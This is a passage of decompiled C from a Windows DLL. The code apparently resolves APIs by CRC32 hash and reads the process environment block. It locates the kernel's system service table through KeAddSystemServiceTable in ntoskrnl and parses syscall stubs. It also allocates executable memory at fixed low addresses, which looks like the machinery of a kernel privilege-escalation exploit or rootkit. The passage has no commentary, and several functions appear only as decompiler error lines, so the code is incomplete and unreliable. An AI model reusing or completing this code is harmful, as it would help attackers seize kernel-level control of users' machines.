      LOWORD(v28) = 520;
      v32 = 0;
      if ( !v7 )
      {
        v15 = a1;
        v9 = a2 + 1108;
        do
        {
          if ( *(_DWORD *)(v9 - 1064) != v3 )
          {
            if ( *(_DWORD *)(v9 + 32) == v3 )
              goto LABEL_28;
            dword_1000B408(v20, *(_DWORD *)v9, v15, v16, v17);
            v26 = dword_1000B3A0(v10, v20, *(_DWORD *)(v9 - 1048) | 0x183, v11);
            if ( v26 == v3 )
              v33 = 1;
            dword_1000B3F4(v24, v9 - 1044);
            v15 = v3;
            dword_1000B3FC(&v27, v24);
            v30 = dword_1000B308(*(int *)((char *)&v28 + 2), -2147483648, 1, v3, 3, 128, v3);
            if ( v30 != -1 )
            {
              v13 = *(_DWORD *)(v9 + 24);
              v12 = *(_DWORD *)(v9 - 1052);
              v14 = *(_DWORD *)(v9 + 28);
              if ( v26 != v13 )
                v33 = 1;
              if ( !sub_100016F0(v30, v14, v12, v9 - 4, v6, *(_DWORD *)(v9 - 1048) | 0x101, a3) )
                v33 = 1;
              v3 = 0;
              if ( v30 )
                dword_1000B320(v30);
              v4 = a2;
            }
            else
            {
LABEL_28:
              v33 = 1;
            }
          }
          ++v32;
          v9 += 1100;
        }
        while ( v32 < *(_DWORD *)(v4 + 40) );
        if ( v33 != v3 )
        {
          *(_DWORD *)(v4 + 16) = 1;
          v31 = 1802046514;
        }
      }
      if ( !dword_1000B364(v6, *(_DWORD *)(v4 + 8)) )
        v31 = 1804733495;
      result = v31;
    }
    else
    {
      result = 1797062657;
    }
  }
  else
  {
    result = 1796866049;
  }
  return result;
}
// 1000250B: could not find valid save-restore pair for esi
// 1000B308: using guessed type int (__stdcall *dword_1000B308)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B320: using guessed type int (__stdcall *dword_1000B320)(_DWORD);
// 1000B364: using guessed type int (__thiscall *dword_1000B364)(_DWORD, _DWORD);
// 1000B3A0: using guessed type int (__thiscall *dword_1000B3A0)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000B3F4: using guessed type int (__stdcall *dword_1000B3F4)(_DWORD, _DWORD);
// 1000B3FC: using guessed type int (__stdcall *dword_1000B3FC)(_DWORD, _DWORD);
// 1000B408: using guessed type int (__cdecl *dword_1000B408)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (100026D6) --------------------------------------------------------
signed int __cdecl sub_100026D6(int a1, int a2, unsigned int a3, int a4, int a5)
{
  int v5; // edi@1
  int v6; // eax@2
  int v7; // eax@3
  int v8; // eax@9
  int v9; // esi@9
  char v10; // zf@15
  int v11; // eax@17
  int v12; // eax@26
  int v13; // ecx@27
  int v14; // eax@31
  __int16 v16; // [sp-14h] [bp-70h]@7
  int v17; // [sp-4h] [bp-60h]@30
  int v18; // [sp+Ch] [bp-50h]@1
  char v19; // [sp+10h] [bp-4Ch]@1
  int v20; // [sp+1Ch] [bp-40h]@1
  __int16 v21; // [sp+28h] [bp-34h]@1
  int v22; // [sp+2Ah] [bp-32h]@1
  int v23; // [sp+2Eh] [bp-2Eh]@1
  int v24; // [sp+32h] [bp-2Ah]@1
  int v25; // [sp+36h] [bp-26h]@1
  __int16 v26; // [sp+3Ch] [bp-20h]@1
  int v27; // [sp+3Eh] [bp-1Eh]@1
  __int16 v28; // [sp+42h] [bp-1Ah]@1
  int v29; // [sp+44h] [bp-18h]@20
  int v30; // [sp+48h] [bp-14h]@1
  int v31; // [sp+4Ch] [bp-10h]@1
  int v32; // [sp+50h] [bp-Ch]@1
  int v33; // [sp+54h] [bp-8h]@1
  int v34; // [sp+58h] [bp-4h]@1
  unsigned int v35; // [sp+64h] [bp+8h]@1
  signed int v36; // [sp+64h] [bp+8h]@6
  int v37; // [sp+64h] [bp+8h]@14

  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  v28 = 0;
  memset(&v19, 0, 0x18u);
  v5 = a1;
  v33 = 0;
  v34 = 0;
  v31 = 0;
  v32 = 0;
  v30 = 0;
  v18 = 1;
  v20 = a1;
  v35 = 0;
  while ( 1 )
  {
    v6 = dword_1000B3B4();
    if ( v6 )
    {
      v7 = dword_1000B3B8(v6, &v31);
      v34 = dword_1000B394(v7);
      if ( v34 )
        break;
    }
    dword_1000B358(100);
    ++v35;
    if ( v35 >= 0xBB8 )
    {
      if ( !v34 )
        return 1781203944;
      break;
    }
  }
  v16 = v34;
  if ( v31 == dword_1000B390() )
  {
    v32 = 1;
    v36 = sub_10001772(v16, 32, (int)&v21, (int)&v26, (int)&v33);
    if ( (_WORD)v36
      || (v8 = sub_100016F0(a5, 28180832, 0, (int)&v26, v33, 0, a4), v9 = v8, !v8)
      || !dword_1000B3A8(v8, 256) )
      return v36;
  }
  else
  {
    v36 = sub_10001772(v16, 32, (int)&v21, (int)&v26, (int)&v33);
    if ( (_WORD)v36 )
      return v36;
    v9 = sub_100016F0(a5, 28180832, v34, (int)&v26, v33, 257, a4);
    v30 = 1;
  }
  *(_DWORD *)(v5 + 52) = v34;
  v37 = 33;
  if ( v9 )
  {
    v10 = v32 == 0;
    *(_DWORD *)(v5 + 44) = 1;
    if ( v10 )
    {
      *(_DWORD *)(v5 + 60) = 0;
      *(_DWORD *)(v5 + 48) = 1;
    }
    *(_DWORD *)(v5 + 56) = v9;
    dword_1000B3AC(1, &v18, 28);
    v11 = 0;
    if ( *(_DWORD *)v5 )
    {
      if ( v32 )
        dword_1000B3A8(v34, 256);
    }
    else
    {
      v29 = 0;
      if ( a3 > 0 )
      {
        v9 = v5 + 1152;
        while ( (_WORD)v37 < 0x3Fu )
        {
          if ( !v30 || *(_DWORD *)(a2 + 4 * v11) != v34 )
          {
            v32 = *(_DWORD *)(a2 + 4 * v11);
            if ( (unsigned __int16)sub_10001772(v32, v37, (int)&v21, (int)&v26, (int)&v33)
              || (v12 = sub_100016F0(a5, 28180832, v32, (int)&v26, v33, 257, a4), !v12)
              || (v13 = v32,
                  *(_DWORD *)(v9 + 8) = 0,
                  *(_DWORD *)(v9 + 4) = v12,
                  *(_DWORD *)(v9 - 8) = 1,
                  *(_DWORD *)(v9 - 4) = 1,
                  *(_DWORD *)v9 = v13,
                  dword_1000B3AC(1, &v18, 28),
                  *(_DWORD *)v5) )
              break;
            v11 = v29;
          }
          ++v11;
          v9 += 1100;
          ++v37;
          v29 = v11;
          if ( v11 >= a3 )
            break;
        }
      }
    }
    v36 = sub_1000250B(v9, v5, a4);
    if ( !(_WORD)v36 )
    {
      v14 = dword_1000B368(v17, *(_DWORD *)(v5 + 12), 30000);
      if ( v14 == 258 )
      {
        v36 = 1791888453;
      }
      else
      {
        if ( v14 )
          v36 = 1794113538;
      }
      if ( !*(_DWORD *)(v5 + 20) )
        v36 = 1794378809;
    }
  }
  else
  {
    v36 = 1787694132;
  }
  return v36;
}
// 1000B358: using guessed type int (__stdcall *dword_1000B358)(_DWORD);
// 1000B368: using guessed type int (__thiscall *dword_1000B368)(_DWORD, _DWORD, _DWORD);
// 1000B390: using guessed type int (*dword_1000B390)(void);
// 1000B394: using guessed type int (__stdcall *dword_1000B394)(_DWORD);
// 1000B3A8: using guessed type int (__stdcall *dword_1000B3A8)(_DWORD, _DWORD);
// 1000B3AC: using guessed type int (__stdcall *dword_1000B3AC)(_DWORD, _DWORD, _DWORD);
// 1000B3B4: using guessed type int (*dword_1000B3B4)(void);
// 1000B3B8: using guessed type int (__stdcall *dword_1000B3B8)(_DWORD, _DWORD);

//----- (1000297C) --------------------------------------------------------
#error "10002B09: positive sp value has been found (funcsize=140)"

//----- (10002B0A) --------------------------------------------------------
signed int __cdecl sub_10002B0A(int a1, int a2, int a3, int a4, int a5, int a6)
{
  unsigned __int8 v6; // bl@1
  unsigned int v7; // esi@2
  int v8; // eax@7
  int v10; // ecx@12
  int v11; // [sp+Ch] [bp-28h]@1
  char v12; // [sp+10h] [bp-24h]@1
  int v13; // [sp+1Ch] [bp-18h]@6
  int v14; // [sp+28h] [bp-Ch]@1
  int v15; // [sp+2Ch] [bp-8h]@1
  int v16; // [sp+30h] [bp-4h]@1

  v11 = 0;
  v16 = 0;
  memset(&v12, 0, 0x18u);
  v14 = 4096;
  v15 = 1753022464;
  v6 = 0;
  while ( 1 )
  {
    v7 = *(_DWORD *)(a2 + 4 * v6);
    if ( v7 < 0x7FFF0000 && (a6 || v7 >= 0x10000) )
    {
      if ( (unsigned int)dword_1000B304(v7, &v11, 28) > 0x1C )
        return 1751384066;
      if ( v13 == 65536 )
      {
        v16 = v7;
        v8 = dword_1000B340(&v16, 0, &v14, 12288, 64);
        if ( !dword_1000B3E8(v8) )
          break;
      }
    }
    ++v6;
    if ( v6 > 0xFFu )
      return 1753222173;
  }
  v10 = v16;
  *(_DWORD *)(a1 + 12) = v7;
  *(_DWORD *)(a1 + 16) = v10;
  *(_BYTE *)(a1 + 20) = v6;
  return v15;
}
// 1000B304: using guessed type int (__stdcall *dword_1000B304)(_DWORD, _DWORD, _DWORD);
// 1000B340: using guessed type int (__stdcall *dword_1000B340)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B3E8: using guessed type int (__stdcall *dword_1000B3E8)(_DWORD);

//----- (10002BC1) --------------------------------------------------------
signed int __cdecl sub_10002BC1(int a1, unsigned int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  int v9; // edi@1
  int v10; // eax@2
  int v11; // ecx@2
  int v12; // esi@7
  unsigned int v13; // ecx@10
  int v14; // edi@13
  bool v15; // eax@15
  signed int v16; // edi@15
  signed int result; // eax@23
  int v18; // eax@25
  int v19; // ecx@28
  unsigned int v20; // [sp+Ch] [bp-14h]@1
  int v21; // [sp+10h] [bp-10h]@1
  int v22; // [sp+14h] [bp-Ch]@5
  int v23; // [sp+18h] [bp-8h]@2
  int v24; // [sp+1Ch] [bp-4h]@1

  v9 = a9;
  *(_DWORD *)a9 = 0;
  v20 = 0;
  v24 = 0;
  v21 = sub_10004B90(dword_1000B434);
  if ( a8 )
  {
    v11 = a7 - a8;
    if ( a7 - a8 < a2 )
      v11 = a2;
    v10 = a2 + a3;
    v23 = a2 + a3;
    v22 = v11 + 2 * a8;
    if ( v11 + 2 * a8 < a2 + a3 )
      goto LABEL_7;
  }
  else
  {
    v10 = a2 + a3;
    v11 = a2;
    v23 = a2 + a3;
  }
  v22 = v10;
LABEL_7:
  v12 = v11;
  do
  {
    if ( v12 >= (unsigned int)v22 )
      break;
    if ( !v24 )
    {
      v13 = *(_DWORD *)v12;
      if ( *(_DWORD *)v12 >= (unsigned int)(a4 + v21) )
      {
        if ( v13 <= v21 + a4 + a6 )
        {
          v20 = *(_DWORD *)v12;
          if ( v13 == *(_DWORD *)(v12 + 8) )
          {
            v14 = *(_DWORD *)(v12 + 4);
            if ( v13 != v14 )
            {
              if ( *(_DWORD *)(v12 + 12) != v14 )
              {
                v15 = 0;
                v16 = 2;
                while ( !v15 )
                {
                  v15 = *(_WORD *)(v16++ + v20 + a5 - a4 - v21) == 3266;
                  if ( (unsigned int)v16 >= 0xA )
                  {
                    if ( !v15 )
                      goto LABEL_20;
                    break;
                  }
                }
                v24 = v12;
              }
            }
          }
        }
LABEL_20:
        v9 = a9;
      }
    }
    v12 += 4;
  }
  while ( !v24 );
  if ( !v24 )
    return 1765346243;
  if ( a8 )
  {
    v18 = v24 - a8;
    if ( v24 - a8 < a2 )
      v18 = a2;
    v19 = v18 + 2 * a8;
    if ( v19 < (unsigned int)v23 )
      goto LABEL_30;
  }
  else
  {
    v18 = a2;
  }
  v19 = v23;
LABEL_30:
  if ( *(_DWORD *)v9 )
    goto LABEL_41;
  do
  {
    if ( v18 >= (unsigned int)v19 )
      break;
    if ( *(_DWORD *)v18 == v20 )
    {
      if ( *(_DWORD *)(v18 + 8) != v20 )
      {
        if ( *(_DWORD *)(v18 - 8) != v20 )
          *(_DWORD *)v9 = v18;
      }
    }
    v18 += 4;
  }
  while ( !*(_DWORD *)v9 );
  result = 1766853571;
  if ( *(_DWORD *)v9 )
LABEL_41:
    result = 1766981632;
  return result;
}
// 1000B434: using guessed type int dword_1000B434;

//----- (10002CF0) --------------------------------------------------------
signed int __cdecl sub_10002CF0(int a1)
{
  __int16 v1; // ax@1
  int v2; // edx@1
  __int16 v3; // si@1

  v2 = *(_DWORD *)(a1 + 4);
  v3 = *(_WORD *)(a1 + 44);
  v1 = *(_WORD *)(a1 + 56);
  if ( *(_DWORD *)a1 == 5 )
  {
    if ( v2 )
    {
      if ( v2 == 1 && (v3 != 28 || v1 != 4) )
        return 1777732596;
    }
    else
    {
      if ( v3 != 24 || v1 != 4 )
        return 1777404916;
    }
  }
  else
  {
    if ( *(_DWORD *)a1 == 6 && (v3 != 32 || v1 != 4) )
      return 1778322420;
  }
  return 1776287744;
}

//----- (10002D55) --------------------------------------------------------
signed int __cdecl sub_10002D55(int a1, int a2, int a3, int a4)
{
  signed int result; // eax@1
  __int16 v5; // bx@1
  int v6; // edi@1
  int v7; // esi@3
  signed int v8; // ecx@7
  int v9; // ecx@12
  int v10; // eax@15
  int v11; // [sp+8h] [bp-18h]@1
  int v12; // [sp+Ch] [bp-14h]@1
  unsigned int v13; // [sp+10h] [bp-10h]@1
  unsigned int v14; // [sp+14h] [bp-Ch]@1
  int v15; // [sp+18h] [bp-8h]@1
  unsigned int v16; // [sp+1Ch] [bp-4h]@3

  v6 = 0;
  v13 = 0;
  v14 = 0;
  v11 = 0;
  v12 = 0;
  v5 = 0;
  v15 = 0;
  result = sub_10004B27(a1, (int)".text", (int)&v13);
  if ( !(_WORD)result )
  {
    result = sub_10004AA4(a1, v13, (int)&v12, (int)&v14);
    if ( !(_WORD)result )
    {
      v7 = v12;
      v16 = 0;
      if ( v14 <= 0 )
      {
LABEL_28:
        result = 1783827416;
      }
      else
      {
        while ( v15 == v6 )
        {
          if ( *(_BYTE *)v7 == -72 && *(_DWORD *)(v7 + 1) == a2 )
          {
            v8 = 5;
            while ( 1 )
            {
              if ( *(_WORD *)(v7 + v8) == 11981 )
              {
                v9 = v8 + 2;
                goto LABEL_14;
              }
              if ( *(_DWORD *)(v7 + v8) == 2147353344 )
                break;
              ++v8;
              if ( (unsigned int)v8 >= 0x10 )
                goto LABEL_25;
            }
            v9 = v8 + 4;
LABEL_14:
            if ( (unsigned int)v9 < 0x10 )
            {
              v10 = v7 + v9;
              while ( *(_BYTE *)v10 != -61 )
              {
                if ( *(_BYTE *)v10 == -62 && (unsigned int)(3 - v7 + v10) < 0x10 )
                {
                  v5 = *(_WORD *)(v10 + 1);
                  goto LABEL_23;
                }
                ++v9;
                ++v10;
                if ( (unsigned int)v9 >= 0x10 )
                  goto LABEL_24;
              }
              v5 = 0;
LABEL_23:
              v15 = 1;
              v11 = v16;
LABEL_24:
              v6 = 0;
            }
          }
LABEL_25:
          ++v7;
          ++v16;
          if ( v16 >= v14 )
          {
            if ( v15 == v6 )
              goto LABEL_28;
            break;
          }
        }
        *(_DWORD *)a4 = v13 + v11;
        *(_WORD *)a3 = v5;
        result = 1781399552;
      }
    }
  }
  return result;
}

//----- (10002E6F) --------------------------------------------------------
signed int __cdecl sub_10002E6F(int a1, int a2)
{
  signed int result; // eax@2
  int v3; // eax@5
  unsigned int v4; // esi@8
  int v5; // [sp+0h] [bp-Ch]@1
  int v6; // [sp+4h] [bp-8h]@1
  int v7; // [sp+8h] [bp-4h]@1

  v7 = 0;
  v5 = 0;
  v6 = 0;
  if ( a1 )
  {
    if ( a2 )
    {
      v3 = *(_DWORD *)(a1 + 36);
      if ( v3 )
      {
        result = sub_10004AA4(dword_1000B434, v3 + 4 * *(_DWORD *)(a1 + 52) - 16384, (int)&v7, (int)&v5);
        if ( !(_WORD)result )
        {
          v4 = *(_DWORD *)v7 - sub_10004B90(dword_1000B434);
          result = sub_10004E6F(dword_1000B434, (int)".text", v4, (int)&v6);
          if ( !(_WORD)result )
          {
            if ( v6 )
              *(_DWORD *)a2 = v4;
            else
              result = 1785791474;
          }
        }
      }
      else
      {
        result = 1782644737;
      }
    }
    else
    {
      result = 1784545281;
    }
  }
  else
  {
    result = 1784610817;
  }
  return result;
}
// 1000B434: using guessed type int dword_1000B434;

//----- (10002F15) --------------------------------------------------------
signed int __cdecl sub_10002F15(unsigned int a1, int a2)
{
  unsigned int v2; // ebx@1
  signed int result; // eax@2
  unsigned int v4; // esi@5
  int v5; // [sp+4h] [bp-10h]@1
  int v6; // [sp+8h] [bp-Ch]@1
  int v7; // [sp+Ch] [bp-8h]@1
  int v8; // [sp+10h] [bp-4h]@1

  v2 = 0;
  v8 = 0;
  v5 = 0;
  v7 = 0;
  v6 = 0;
  if ( !a2 )
    return 1784741889;
  result = sub_10004AA4(dword_1000B434, a1, (int)&v8, (int)&v5);
  if ( !(_WORD)result )
  {
    while ( 1 )
    {
      if ( *(_BYTE *)v8 != -24 )
        goto LABEL_16;
      v4 = v2 + *(_DWORD *)(v8 + 1) + a1 + 5;
      result = sub_10004E6F(dword_1000B434, (int)".text", v4, (int)&v6);
      if ( (_WORD)result )
        return result;
      if ( v6 )
      {
        ++v7;
        if ( v7 == 3 )
        {
          *(_DWORD *)a2 = v4;
          return 1788149760;
        }
        v8 += 5;
      }
      else
      {
LABEL_16:
        ++v8;
      }
      ++v2;
      if ( v2 >= 0x100 )
        return 1788611527;
    }
  }
  return result;
}
// 1000B434: using guessed type int dword_1000B434;

//----- (10002FBC) --------------------------------------------------------
signed int __cdecl sub_10002FBC(unsigned int a1, int a2)
{
  int v2; // edi@1
  signed int result; // eax@2
  int v4; // eax@6
  int v5; // edi@6
  unsigned int v6; // esi@6
  unsigned int v7; // esi@17
  int v8; // [sp+4h] [bp-18h]@1
  int v9; // [sp+8h] [bp-14h]@1
  int v10; // [sp+Ch] [bp-10h]@1
  int v11; // [sp+10h] [bp-Ch]@1
  unsigned int v12; // [sp+14h] [bp-8h]@4
  int v13; // [sp+18h] [bp-4h]@1

  v2 = 0;
  v13 = 0;
  v8 = 0;
  v11 = 0;
  v9 = 0;
  v10 = 0;
  if ( !a2 )
    return 1787691009;
  result = sub_10004AA4(dword_1000B434, a1, (int)&v13, (int)&v8);
  if ( !(_WORD)result )
  {
    v12 = 0;
    while ( 1 )
    {
      if ( *(_WORD *)v13 == 13823 )
      {
        v6 = *(_DWORD *)(v13 + 2);
        v5 = sub_10004B90(dword_1000B434);
        v4 = sub_10004EEF(dword_1000B434);
        if ( v6 >= v5 && v6 < v5 + v4 )
        {
          result = sub_10004E6F(dword_1000B434, (int)".data", v6 - v5, (int)&v10);
          if ( (_WORD)result )
            return result;
          if ( !v10 )
            return 1789725640;
          v2 = 0;
LABEL_15:
          if ( v12 >= 0x100 )
          {
            result = 1791495112;
          }
          else
          {
            while ( 1 )
            {
              while ( 1 )
              {
                if ( *(_BYTE *)v13 == -24 )
                {
                  v7 = v12 + *(_DWORD *)(v13 + 1) + a1 + 5;
                  result = sub_10004E6F(dword_1000B434, (int)".text", v7, (int)&v9);
                  if ( (_WORD)result != (_WORD)v2 )
                    return result;
                  if ( v9 != v2 )
                    break;
                }
                ++v13;
              }
              ++v11;
              if ( v11 == 2 )
                break;
              v13 += 5;
            }
            *(_DWORD *)a2 = v7;
            result = 1791033344;
          }
          return result;
        }
        v2 = 0;
      }
      ++v13;
      ++v12;
      if ( v12 >= 0x100 )
        goto LABEL_15;
    }
  }
  return result;
}
// 1000B434: using guessed type int dword_1000B434;

//----- (100030E3) --------------------------------------------------------
signed int __cdecl sub_100030E3(unsigned int a1, int a2)
{
  signed int result; // eax@2
  int v3; // ebx@4
  int v4; // edi@4
  unsigned int v5; // eax@5
  int v6; // esi@7
  char v7; // al@10
  int v8; // [sp+4h] [bp-14h]@1
  int v9; // [sp+8h] [bp-10h]@1
  unsigned int v10; // [sp+Ch] [bp-Ch]@4
  int v11; // [sp+10h] [bp-8h]@1
  unsigned int *v12; // [sp+14h] [bp-4h]@1

  v12 = 0;
  v8 = 0;
  v11 = 0;
  v9 = 0;
  if ( a2 )
  {
    result = sub_10004AA4(dword_1000B434, a1, (int)&v12, (int)&v8);
    if ( !(_WORD)result )
    {
      v4 = sub_10004B90(dword_1000B434);
      v3 = sub_10004EEF(dword_1000B434);
      v10 = 2;
      while ( 1 )
      {
        v5 = *v12;
        if ( *v12 >= v4 && v5 < v3 + v4 )
        {
          v6 = v5 - v4;
          result = sub_10004E6F(dword_1000B434, (int)".data", v5 - v4, (int)&v9);
          if ( (_WORD)result )
            return result;
          if ( v9 )
          {
            ++v11;
            if ( v11 == 5 )
              return 1796344774;
            v7 = *((_BYTE *)v12 - 2);
            if ( v7 == 59 || v7 == 57 )
            {
              if ( v6 )
                break;
            }
          }
        }
        v12 = (unsigned int *)((char *)v12 + 1);
        ++v10;
        if ( v10 >= 0x100 )
          return 1795361737;
      }
      *(_DWORD *)a2 = v6;
      result = 1796931584;
    }
  }
  else
  {
    result = 1794637825;
  }
  return result;
}
// 1000B434: using guessed type int dword_1000B434;

//----- (100031CC) --------------------------------------------------------
signed int __cdecl sub_100031CC(int a1)
{
  signed int result; // eax@2
  int v2; // [sp+4h] [bp-10h]@1
  unsigned int v3; // [sp+8h] [bp-Ch]@1
  unsigned int v4; // [sp+Ch] [bp-8h]@1
  unsigned int v5; // [sp+10h] [bp-4h]@1

  v5 = 0;
  v4 = 0;
  v3 = 0;
  v2 = 0;
  if ( a1 )
  {
    result = sub_10002E6F(a1, (int)&v5);
    if ( !(_WORD)result )
    {
      result = sub_10002F15(v5, (int)&v4);
      if ( !(_WORD)result )
      {
        result = sub_10002FBC(v4, (int)&v3);
        if ( !(_WORD)result )
        {
          result = sub_100030E3(v3, (int)&v2);
          if ( !(_WORD)result )
          {
            *(_DWORD *)(a1 + 32) = v2;
            result = 1799159808;
          }
        }
      }
    }
  }
  else
  {
    result = 1796145153;
  }
  return result;
}

//----- (10003249) --------------------------------------------------------
signed int __cdecl sub_10003249(int a1, int a2, int a3, int a4, int a5)
{
  return sub_10002B0A(a1, a2, a3, a4, a5, 0);
}

//----- (1000326C) --------------------------------------------------------
signed int __cdecl sub_1000326C(int a1)
{
  int v1; // eax@1
  unsigned int v2; // edx@1
  signed int result; // eax@10
  int v4; // [sp+4h] [bp-8h]@1
  int v5; // [sp+8h] [bp-4h]@1

  v1 = 0;
  v4 = 0;
  v2 = 0;
  v5 = 0;
  while ( !v1 )
  {
    if ( *(_BYTE *)(v2 + dword_1000B3A4) != -24
      || *(_BYTE *)(v2 + *(_DWORD *)(v2 + dword_1000B3A4 + 1) + dword_1000B3A4 + 5) != -72
      || (v1 = *(_DWORD *)(v2 + *(_DWORD *)(v2 + dword_1000B3A4 + 1) + dword_1000B3A4 + 6), (unsigned int)v1 < 0x1000)
      || (unsigned int)v1 > 0x2000 )
      v1 = 0;
    ++v2;
    if ( v2 >= 0x19 )
    {
      if ( !v1 )
        return 1769802692;
      break;
    }
  }
  *(_DWORD *)(a1 + 52) = v1;
  result = sub_10002D55(dword_1000B430, v1, (int)&v5, (int)&v4);
  if ( !(_WORD)result )
  {
    *(_WORD *)(a1 + 56) = v5;
    *(_DWORD *)(a1 + 60) = v4;
    result = 1769668608;
  }
  return result;
}
// 1000B3A4: using guessed type int dword_1000B3A4;
// 1000B430: using guessed type int dword_1000B430;

//----- (100032F7) --------------------------------------------------------
signed int __cdecl sub_100032F7(int a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
  signed int result; // eax@1
  unsigned int v8; // esi@1
  int v9; // edi@4
  unsigned int v10; // eax@14
  unsigned int v11; // ecx@16
  unsigned __int16 v12; // bx@22
  unsigned int v13; // esi@22
  int v14; // ST04_4@33
  int v15; // [sp+8h] [bp-2Ch]@1
  int v16; // [sp+Ch] [bp-28h]@1
  unsigned int v17; // [sp+10h] [bp-24h]@1
  unsigned int v18; // [sp+14h] [bp-20h]@12
  unsigned int v19; // [sp+18h] [bp-1Ch]@1
  int v20; // [sp+1Ch] [bp-18h]@1
  unsigned int v21; // [sp+20h] [bp-14h]@1
  unsigned int v22; // [sp+24h] [bp-10h]@1
  unsigned int *v23; // [sp+28h] [bp-Ch]@1
  int v24; // [sp+2Ch] [bp-8h]@1
  int v25; // [sp+30h] [bp-4h]@1

  v25 = 0;
  v17 = 0;
  v20 = 0;
  v22 = 0;
  v24 = 0;
  v8 = 0;
  v23 = 0;
  v21 = 0;
  v19 = 0;
  v16 = 0;
  v15 = 0;
  result = sub_10004B27(dword_1000B434, (int)"INIT", (int)&v17);
  if ( !(_WORD)result )
  {
    result = sub_10004AA4(dword_1000B434, v17, (int)&v20, (int)&v22);
    if ( !(_WORD)result )
    {
      result = sub_10004D27(dword_1000B434, (int)"KeAddSystemServiceTable", (int)"NTOSKrNL.EXE", (int)&v24);
      if ( !(_WORD)result )
      {
        v9 = sub_10004B90(dword_1000B434);
        v24 += v9;
        if ( v22 <= 0 )
        {
LABEL_11:
          result = 1770916823;
        }
        else
        {
          while ( !v23 )
          {
            if ( *(_WORD *)(v8 + v20) == 5631 )
            {
              if ( *(_DWORD *)(v8 + v20 + 2) == v24 )
                v23 = (unsigned int *)(v8 + v20);
            }
            ++v8;
            if ( v8 >= v22 )
            {
              if ( !v23 )
                goto LABEL_11;
              break;
            }
          }
          v18 = 0;
          while ( !v21 )
          {
            v10 = *v23;
            if ( *v23 >= a5 + v9 )
            {
              if ( v10 <= v9 + a5 + a7 )
              {
                v11 = *(_DWORD *)(v10 - a5 - v9 + a6);
                if ( v11 >= a2 + v9 )
                {
                  if ( v11 <= v9 + a2 + a4 )
                  {
                    v21 = v10 - v9;
                    *(_DWORD *)(a1 + 36) = v10 - v9;
                  }
                }
              }
            }
            ++v18;
            v23 = (unsigned int *)((char *)v23 - 1);
            if ( v18 >= 0x19 )
            {
              if ( !v21 )
                return 1772293079;
              break;
            }
          }
          v12 = *(_WORD *)(dword_1000B3B0 + 1) - 4096;
          v13 = 0;
          do
          {
            if ( v13 >= 5 )
              break;
            sub_10004AA4(dword_1000B434, *(_DWORD *)(a6 + 4 * (v13 + v12) + 4 - a5 + v21) - v9, (int)&v20, (int)&v22);
            while ( !(_WORD)v25 && v19 < 0x60 )
            {
              if ( *(_DWORD *)(v19 + v20 + 3) )
                v25 = (unsigned __int16)(v13 + v12 + 4097);
              ++v19;
            }
            ++v13;
          }
          while ( !(_WORD)v25 );
          if ( (_WORD)v25 )
          {
            v14 = (unsigned __int16)v25;
            *(_DWORD *)(a1 + 40) = (unsigned __int16)v25;
            result = sub_10002D55(dword_1000B430, v14, (int)&v16, (int)&v15);
            if ( !(_WORD)result )
            {
              *(_WORD *)(a1 + 44) = v16;
              *(_DWORD *)(a1 + 48) = v15;
              result = 1774387200;
            }
          }
          else
          {
            result = 1776094149;
          }
        }
      }
    }
  }
  return result;
}
// 1000B3B0: using guessed type int dword_1000B3B0;
// 1000B430: using guessed type int dword_1000B430;
// 1000B434: using guessed type int dword_1000B434;

//----- (10003508) --------------------------------------------------------
#error "10003829: positive sp value has been found (funcsize=265)"

//----- (1000382A) --------------------------------------------------------
int __cdecl sub_1000382A()
{
  return *MK_FP(__FS__, 48);
}

//----- (10003841) --------------------------------------------------------
signed int __cdecl sub_10003841(int a1)
{
  int v1; // eax@1
  int v2; // esi@1
  signed int v3; // edx@2
  int v4; // ecx@2

  v2 = a1;
  v1 = -1;
  while ( *(_BYTE *)v2 )
  {
    v4 = *(_BYTE *)v2 ^ (unsigned __int8)v1;
    v3 = 8;
    do
    {
      if ( v4 & 1 )
        v4 = ((unsigned int)v4 >> 1) ^ 0xEDB88320;
      else
        v4 = (unsigned int)v4 >> 1;
      --v3;
    }
    while ( v3 );
    v1 = v4 ^ ((unsigned int)v1 >> 8);
    ++v2;
  }
  return ~v1;
}

//----- (1000387A) --------------------------------------------------------
unsigned int __cdecl sub_1000387A(int a1, unsigned int a2)
{
  unsigned int result; // eax@1

  result = 0;
  if ( a2 )
  {
    do
    {
      if ( !*(_BYTE *)(result + a1) )
        break;
      ++result;
    }
    while ( result < a2 );
  }
  return result;
}

//----- (10003894) --------------------------------------------------------
int __cdecl sub_10003894(int a1, int a2)
{
  char v2; // al@1
  int v3; // ebx@1
  int v4; // ecx@2

  v2 = *(_BYTE *)a1;
  v3 = 0;
  if ( *(_BYTE *)a1 == *(_BYTE *)a2 )
  {
    v4 = a2;
    do
    {
      if ( !v2 )
        break;
      ++v3;
      ++v4;
      v2 = *(_BYTE *)(a1 - a2 + v4);
    }
    while ( v2 == *(_BYTE *)v4 );
  }
  return *(_BYTE *)(v3 + a1) - *(_BYTE *)(v3 + a2);
}

//----- (100038C8) --------------------------------------------------------
int __cdecl sub_100038C8(int a1, int a2, unsigned int a3)
{
  unsigned int v3; // ecx@1
  int v4; // eax@2
  int result; // eax@6

  v3 = 0;
  if ( a3 )
  {
    v4 = a1;
    do
    {
      if ( *(_BYTE *)v4 != *(_BYTE *)(a2 - a1 + v4) )
        break;
      ++v3;
      ++v4;
    }
    while ( v3 < a3 );
  }
  if ( v3 == a3 )
    result = 0;
  else
    result = *(_BYTE *)(v3 + a1) - *(_BYTE *)(v3 + a2);
  return result;
}

//----- (10003907) --------------------------------------------------------
int __cdecl sub_10003907(int a1, int a2, int a3)
{
  int v3; // esi@1
  int v4; // ecx@2

  v3 = a3;
  if ( a3 )
  {
    v4 = a1;
    do
    {
      *(_BYTE *)v4 = *(_BYTE *)(a2 - a1 + v4);
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  return a1;
}

//----- (10003929) --------------------------------------------------------
int __cdecl sub_10003929(int a1)
{
  int result; // eax@2

  if ( a1 )
    result = dword_1000B33C(dword_1000B2F8, 0, a1);
  return result;
}
// 1000B2F8: using guessed type int dword_1000B2F8;
